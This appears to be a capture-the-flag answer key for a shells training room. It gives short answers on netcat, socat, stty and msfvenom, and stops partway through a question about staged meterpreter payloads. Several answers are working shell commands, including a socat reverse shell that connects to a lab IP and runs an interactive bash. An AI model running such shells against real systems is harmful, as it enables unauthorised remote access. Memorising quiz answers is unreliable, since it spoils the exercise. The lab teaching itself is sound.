# What the Shell?

- Read and understand the introduction.

	  no answer needed

- Read the above and check out the links!

	  no answer needed

- Which type of shell connects back to a listening port on your computer, Reverse (R) or Bind (B)?

	- `R`

- You have injected malicious shell code into a website. Is the shell you receive likely to be interactive? (Y or N)

	- `N`

- When using a bind shell, would you execute a listener on the Attacker (A) or the Target (T)?

	- `T`

- Which option tells netcat to listen?

	- `-l`

- How would you connect to a bind shell on the IP address: 10.10.10.11 with port 8080?

	- `nc 10.10.10.11 8080`

- How would you change your terminal size to have 238 columns?

	- `stty cols 238`

- What is the syntax for setting up a Python3 webserver on port 80?

	- `sudo python3 -m http.server -p 80`

- How would we get socat to listen on TCP port 8080?

	- `TCP-L:8080`

- What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"

	- `socat OPENSSL-LISTENER:53,cert=encrypt.pem,verify=0 FILE:'tty',raw,echo=0`

- If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?

	- `socat TCP:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

- What command can be used to create a named pipe in Linux?

	- `mkfifo`

- Look through the linked Payloads all the Things Reverse Shell Cheatsheet and familiarise yourself with the languages available.

	  no answer needed

- Generate a staged reverse shell for a 64 bit Windows target, in a .exe format using your TryHackMe tun0 IP address and a chosen port.

	  no answer needed

- Which symbol is used to show that a shell is stageless?

	- `_`

- What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell